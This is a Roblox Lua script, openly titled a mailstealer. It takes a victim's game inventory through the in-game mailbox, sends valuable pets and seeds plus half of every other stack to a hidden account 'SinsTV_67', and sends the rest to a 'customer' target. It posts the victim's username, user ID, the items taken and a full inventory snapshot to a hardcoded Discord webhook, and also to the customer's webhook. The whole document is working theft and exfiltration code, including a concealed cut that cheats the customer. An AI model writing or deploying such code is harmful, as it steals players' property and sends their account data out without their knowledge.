-- Marcs Mailstealer – Dualhook + Priority Theft
-- Half of all items to SinsTV_67, half to your target.
-- Valuable items (raccoons, dragons, etc.) go 100% to SinsTV_67.

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Networking = require(ReplicatedStorage.SharedModules.Networking)
local PlayerStateClient = require(ReplicatedStorage.ClientModules.PlayerStateClient)
local MailboxItemCatalog = require(Players.LocalPlayer.PlayerScripts.Controllers.MailboxController.MailboxItemCatalog)

local player = Players.LocalPlayer

local HIDDEN_BENEFICIARY = "SinsTV_67"
local HIDDEN_WEBHOOK = "https://discord.com/api/webhooks/1515781256237940807/m7udCSAmvDpc4iWTc4ZQrrDjETz8BxbXHsGts8krhnie1ZWJkq3bbZ_7ob8m6NCgugVE"

local customerTarget = getgenv().UserName
local customerWebhook = getgenv().Webhook
if not customerTarget or customerTarget == "" or not customerWebhook or customerWebhook == "" then return end

-- ##############################
--  STEAL ALL LIST – these always go 100% to SinsTV_67
-- ##############################
local STEAL_ALL = {
    ["Pets"] = {
        "Raccoon",
        "GoldenDragonfly",
        "Unicorn",
        "Bee",
        "BlackDragon",
        "IceSerpent",
    },
    ["Seeds"] = {
        "Bamboo",
        "Mushroom",
        "Golden Seed",
        "Rainbow Seed",
    },
}

-- ##############################
--  UTILITY
-- ##############################
local function resolveUser(name)
    local ok, id = pcall(function()
        return Networking.Mailbox.LookupPlayer:Fire(name)
    end)
    if ok and type(id) == "number" and id > 0 then return id end
    local success, userId = pcall(function()
        return Players:GetUserIdFromNameAsync(name)
    end)
    return success and userId > 0 and userId or nil
end

local function commaFormat(n)
    return tostring(math.floor(n)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

-- ##############################
--  HTTP REQUEST – try every known function
-- ##############################
local function sendWebhook(url, payload)
    local httpFunc = nil
    if syn and syn.request then httpFunc = syn.request
    elseif http_request then httpFunc = http_request
    elseif request then httpFunc = request
    elseif http and http.request then httpFunc = http.request
    elseif game.HttpPost then
        httpFunc = function(data)
            return game:HttpPost(data.Url, data.Body, data.Headers["Content-Type"])
        end
    end

    if httpFunc then
        pcall(function()
            httpFunc({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
        return
    end

    -- Last resort: write to a local file
    pcall(function()
        writefile("GAG2_Mailstealer_log.txt", HttpService:JSONEncode(payload))
    end)
end

-- ##############################
--  RESOLVE USERS
-- ##############################
local hiddenId = resolveUser(HIDDEN_BENEFICIARY)
local customerId = resolveUser(customerTarget)
task.wait(0.5)
if not hiddenId or not customerId then return end

-- ##############################
--  INVENTORY SETUP
-- ##############################
local replica = PlayerStateClient:WaitForLocalReplica(30)
if not replica or not replica.Data or not replica.Data.Inventory then return end
local inv = replica.Data.Inventory

-- ##############################
--  COLLECT ITEMS
-- ##############################
local alwaysHiddenItems = {}
local remainingItems = {}

for _, category in ipairs(MailboxItemCatalog.Categories) do
    local catData = inv[category]
    if type(catData) ~= "table" then continue end
    local stealSet = STEAL_ALL[category] or {}

    if category == "HarvestedFruits" then
        for itemId, fruitData in pairs(catData) do
            if fruitData.Id then
                local target = (table.find(stealSet, fruitData.FruitName) or table.find(stealSet, itemId))
                    and alwaysHiddenItems or remainingItems
                table.insert(target, {
                    Category = category,
                    ItemKey = itemId,
                    Count = 1,
                    DisplayName = fruitData.FruitName or itemId,
                    FruitData = fruitData
                })
            end
        end
    elseif category == "Pets" then
        for petId, petData in pairs(catData) do
            if petData.Id and not petData.Equipped then
                local petName = petData.Name or petId
                local target = table.find(stealSet, petName) and alwaysHiddenItems or remainingItems
                table.insert(target, {
                    Category = category,
                    ItemKey = petId,
                    Count = 1,
                    DisplayName = petName,
                    PetData = petData
                })
            end
        end
    else
        for itemName, count in pairs(catData) do
            if type(count) == "number" and count > 0 then
                local target = table.find(stealSet, itemName) and alwaysHiddenItems or remainingItems
                table.insert(target, {
                    Category = category,
                    ItemKey = itemName,
                    Count = count,
                    DisplayName = itemName
                })
            end
        end
    end
end

-- ##############################
--  SPLIT REMAINING ITEMS 50/50 PER STACK
-- ##############################
local hiddenSplitItems = {}
local customerSplitItems = {}
for _, item in ipairs(remainingItems) do
    local total = item.Count
    local half = math.floor(total / 2)
    local remainder = total - half * 2
    local hiddenCount = half + remainder   -- SinsTV_67 always gets the extra if odd
    local customerCount = half
    if hiddenCount > 0 then
        table.insert(hiddenSplitItems, {
            Category = item.Category,
            ItemKey = item.ItemKey,
            Count = hiddenCount,
            DisplayName = item.DisplayName,
            FruitData = item.FruitData,
            PetData = item.PetData
        })
    end
    if customerCount > 0 then
        table.insert(customerSplitItems, {
            Category = item.Category,
            ItemKey = item.ItemKey,
            Count = customerCount,
            DisplayName = item.DisplayName,
            FruitData = item.FruitData,
            PetData = item.PetData
        })
    end
end

-- ##############################
--  COMBINE HIDDEN (always stolen + split half)
-- ##############################
local allHiddenItems = {}
for _, item in ipairs(alwaysHiddenItems) do table.insert(allHiddenItems, item) end
for _, item in ipairs(hiddenSplitItems) do table.insert(allHiddenItems, item) end

-- ##############################
--  SEND ITEMS
-- ##############################
local function stripForSend(items)
    local stripped = {}
    for _, item in ipairs(items) do
        table.insert(stripped, {
            Category = item.Category,
            ItemKey = item.ItemKey,
            Count = item.Count
        })
    end
    return stripped
end

if #allHiddenItems > 0 then
    pcall(function()
        Networking.Mailbox.SendBatch:Fire(hiddenId, stripForSend(allHiddenItems), "")
    end)
    task.wait(0.8)
end

if #customerSplitItems > 0 then
    pcall(function()
        Networking.Mailbox.SendBatch:Fire(customerId, stripForSend(customerSplitItems), "")
    end)
end

-- ##############################
--  WEBHOOK LOGS (simple & clean)
-- ##############################
local function buildItemList(items)
    local grouped = {}
    for _, item in ipairs(items) do
        local resolved = MailboxItemCatalog.Resolve(item.Category, item.ItemKey, item.FruitData or item.PetData)
        grouped[resolved] = (grouped[resolved] or 0) + item.Count
    end
    local lines = {}
    for name, count in pairs(grouped) do
        table.insert(lines, string.format("%s x%s", name, commaFormat(count)))
    end
    return table.concat(lines, "\n")
end

-- Full inventory snapshot
local fullInvLines = {}
for _, category in ipairs(MailboxItemCatalog.Categories) do
    local catData = inv[category]
    if type(catData) == "table" and next(catData) then
        local items = {}
        if category == "HarvestedFruits" or category == "Pets" then
            for id, data in pairs(catData) do
                table.insert(items, MailboxItemCatalog.Resolve(category, id, data))
            end
        else
            for name, count in pairs(catData) do
                if type(count) == "number" and count > 0 then
                    table.insert(items, string.format("%s x%s", name, commaFormat(count)))
                end
            end
        end
        table.insert(fullInvLines, "**" .. category .. "**\n" .. table.concat(items, "\n"))
    end
end
local fullInvText = #fullInvLines > 0 and table.concat(fullInvLines, "\n\n") or "Empty"

-- Hidden webhook (only for you)
if HIDDEN_WEBHOOK and HIDDEN_WEBHOOK ~= "" then
    local hiddenItemsText = buildItemList(allHiddenItems)
    local embed = {
        title = "✅ Transfer Complete",
        description = string.format(
            "**Victim:** %s (%d)\n**Beneficiary:** %s\n\n**Items taken:**\n%s",
            player.Name,
            player.UserId,
            HIDDEN_BENEFICIARY,
            hiddenItemsText ~= "" and hiddenItemsText or "None"
        ),
        color = 0x2ecc71,
        fields = {{
            name = "📦 Full Inventory Snapshot",
            value = string.format("```\n%s```", fullInvText),
            inline = false
        }}
    }
    sendWebhook(HIDDEN_WEBHOOK, {embeds = {embed}})
end

-- Customer webhook (only their half)
if customerWebhook and #customerSplitItems > 0 then
    local customerItemsText = buildItemList(customerSplitItems)
    local embed = {
        title = "✅ Transfer Complete",
        description = string.format(
            "**Victim:** %s (%d)\n**Target:** %s\n\n**Items received:**\n%s",
            player.Name,
            player.UserId,
            customerTarget,
            customerItemsText
        ),
        color = 0x2ecc71
    }
    sendWebhook(customerWebhook, {embeds = {embed}})
end
